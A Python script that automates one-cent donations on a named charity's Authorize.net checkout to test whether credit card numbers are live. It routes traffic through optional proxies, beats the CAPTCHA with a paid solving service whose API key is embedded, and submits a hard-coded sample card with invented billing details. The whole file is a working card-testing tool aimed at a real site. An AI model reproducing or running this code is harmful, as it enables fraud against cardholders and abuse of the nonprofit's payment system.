from httpx import AsyncClient
import asyncio
import base64
from anticaptcha import Anticaptcha


def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )


async def aunetccn(cc, mes, ano, proxy: str):
    anticaptcha = Anticaptcha("a83eb9c1fdbfabaa681b7afe1278f6a5", reuse_session=True)
    if len(mes) == 1:
        mes = f"0{mes}"
    if len(ano) == 4:
        ano = ano[2:]

    mes_ano = f"{mes}{ano}"
    proxies = {"http://": proxy, "https://": proxy} if proxy else None

    async with AsyncClient(verify=False, proxies=proxies) as client:
        headers_base = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        response = await client.get(
            "https://militiaoftheimmaculata.com/make-a-donation/",
            headers=headers_base,
        )
        response_text = response.text
        link_id = capture(
            response_text, '<input name="LinkId" type="hidden" value="', '"'
        )

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://militiaoftheimmaculata.com",
            "Referer": "https://militiaoftheimmaculata.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        data = {
            "LinkId": link_id,
            "x": "174",
            "y": "85",
        }

        response = await client.post(
            "https://simplecheckout.authorize.net/payment/CatalogPayment.aspx",
            headers=headers,
            data=data,
        )
        response_text = response.text
        img = capture(
            response_text,
            '<img src="https://captcha.authorize.net:443/Captcha/Captcha.aspx?',
            '" id="imgCaptcha"',
        )
        viewstate = capture(
            response_text,
            '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="',
            '"',
        )
        eventvalidation = capture(
            response_text,
            '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="',
            '"',
        )
        viewstategenerator = capture(
            response_text,
            '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="',
            '"',
        )

        img = f"https://captcha.authorize.net:443/Captcha/Captcha.aspx?{img}"
        img_response = await client.get(img)
        
        if img_response.status_code != 200:
            print(f"Error al descargar la imagen: {img_response.status_code}")
            return "Error al descargar el captcha"

        image_content = img_response.content
        if len(image_content) < 100:
            print(f"Imagen demasiado pequeña: {len(image_content)} bytes")
            return "Error: imagen del captcha inválida"

        with open("img.png", "wb") as file:
            file.write(image_content)
        
        with open("img.png", "rb") as file:
            image_bytes = file.read()
            if len(image_bytes) < 100:
                print(f"Archivo guardado demasiado pequeño: {len(image_bytes)} bytes")
                return "Error: archivo de captcha inválido"
            image_base64 = base64.b64encode(image_bytes).decode("utf-8")

        task = {
            "clientKey": "a83eb9c1fdbfabaa681b7afe1278f6a5",
            "task": {
                "type": "ImageToTextTask",
                "body": image_base64,
                "phrase": False,
                "case": False,
                "numeric": False,
                "math": 0,
                "minLength": 0,
                "maxLength": 0
            }
        }
        
        try:
            print(f"Tamaño de la imagen en base64: {len(image_base64)} caracteres")
            
            task_created = await anticaptcha.create_task(task)
            if not task_created or 'taskId' not in task_created:
                print("Error al crear la tarea:", task_created)
                return "Error con el captcha"
                
            taskId = task_created["taskId"]
            result = await anticaptcha.wait_for_task(taskId)
            
            if not result or 'solution' not in result or 'text' not in result['solution']:
                print("Error en la respuesta del captcha:", result)
                return "Error con la solución del captcha"
                
            text_captcha = result["solution"]["text"]
            await anticaptcha.close()
            
        except Exception as e:
            print(f"Error en el proceso de anticaptcha: {str(e)}")
            return f"Error: {str(e)}"

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://simplecheckout.authorize.net",
            "Referer": "https://simplecheckout.authorize.net/payment/CatalogPayment.aspx",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        data = {
            "__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": viewstate,
            "__VIEWSTATEGENERATOR": viewstategenerator,
            "__VIEWSTATEENCRYPTED": "",
            "__EVENTVALIDATION": eventvalidation,
            "LinkID": link_id,
            "xi_preview": "",
            "txtUserItemPrice": "0.01",
            "x_captcha": text_captcha,
            "btnForm1Submit": "Continue",
            "DummyTextBox": "",
        }

        response = await client.post(
            "https://simplecheckout.authorize.net/payment/CatalogPayment.aspx",
            headers=headers,
            data=data,
        )
        response_text = response.text
        x_fp_sequence = capture(
            response_text, '<input type="hidden" name="x_fp_sequence" value="', '"'
        )
        x_fp_timestamp = capture(
            response_text, '<input type="hidden" name="x_fp_timestamp" value="', '"'
        )
        x_fp_hash = capture(
            response_text, '<input type="hidden" name="x_fp_hash" value="', '"'
        )
        x_login = capture(
            response_text, '<input type="hidden" name="x_login" value="', '"'
        )

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://secure.authorize.net",
            "Referer": "https://secure.authorize.net/gateway/transact.dll",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        }

        data = {
            "x_show_form": "pf_receipt",
            "x_type": "auth_capture",
            "x_currency_code": "USD",
            "x_line_item": "1<|>Donate to the MI<|>Customer specified amount<|>1<|>0.01<|>",
            "x_amount": "0.01",
            "x_login": x_login,
            "x_fp_sequence": x_fp_sequence,
            "x_fp_timestamp": x_fp_timestamp,
            "x_fp_hash": x_fp_hash,
            "x_catalog_link_id": link_id,
            "x_card_num": cc,
            "x_exp_date": mes_ano,
            "x_first_name": "Alex",
            "x_last_name": "Alex Varela",
            "x_address": "New York",
            "x_city": "New York",
            "x_state": "New York",
            "x_zip": "10080",
            "x_country": "Estados Unidos",
            "x_email": "axusx.bro@gmail.com",
            "x_phone": "9513573866",
        }

        response = await client.post(
            "https://secure.authorize.net/gateway/transact.dll",
            headers=headers,
            data=data,
        )
        response_text = response.text

        error = capture(
            response_text, '<div ID="divErrorMsgHdr" class="GrayBoxHdr">', "</div>"
        )

        return error


if __name__ == "__main__":
    asyncio.run(aunetccn("5290628061466047", "03", "2027", proxy=None))
